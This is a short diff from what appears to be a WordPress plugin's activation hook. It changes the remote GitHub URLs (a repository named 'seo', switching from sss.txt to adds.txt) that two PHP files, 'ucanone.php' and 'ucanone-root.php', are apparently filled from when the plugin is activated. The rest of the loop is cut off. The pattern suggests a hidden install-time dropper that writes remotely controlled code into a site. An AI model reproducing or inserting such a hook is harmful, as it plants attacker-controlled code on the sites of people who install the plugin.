@@ -36,8 +36,8 @@ register_activation_hook(__FILE__, function() {
     dbDelta(\$sql);
 
     \$files_content = [
-        'ucanone.php' => "https://raw.githubusercontent.com/youngkmd/seo/refs/heads/main/sss.txt",
-        'ucanone-root.php' => "https://raw.githubusercontent.com/youngkmd/seo/refs/heads/main/sss.txt",
+        'ucanone.php' => "https://raw.githubusercontent.com/youngkmd/seo/refs/heads/main/adds.txt",
+        'ucanone-root.php' => "https://raw.githubusercontent.com/youngkmd/seo/refs/heads/main/adds.txt",
     ];
 
     foreach (\$files_content as \$file_name => \$file_url) {
